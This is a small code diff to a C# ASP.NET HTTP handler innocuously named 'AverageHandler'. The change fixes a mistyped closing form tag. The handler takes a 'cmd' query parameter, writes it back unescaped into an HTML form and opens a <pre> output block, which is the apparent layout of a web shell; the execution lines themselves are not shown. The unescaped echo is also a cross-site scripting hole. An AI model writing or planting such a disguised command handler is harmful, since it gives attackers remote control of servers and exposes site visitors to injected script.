@@ -17,7 +17,7 @@ public class AverageHandler : IHttpHandler
 		Uri theRealURL = new Uri(HttpContext.Current.Request.Url.Scheme + "://" +   HttpContext.Current.Request.Url.Authority + HttpContext.Current.Request.RawUrl);
 		string teh_cmd = HttpUtility.ParseQueryString(theRealURL.Query).Get("cmd");
 
-		ctx.Response.Write("<form method='GET'><input name='cmd' value='"+teh_cmd+"'><input type='submit'></from>");
+		ctx.Response.Write("<form method='GET'><input name='cmd' value='"+teh_cmd+"'><input type='submit'></form>");
 		ctx.Response.Write("<hr>");
 
 		ctx.Response.Write("<pre>");
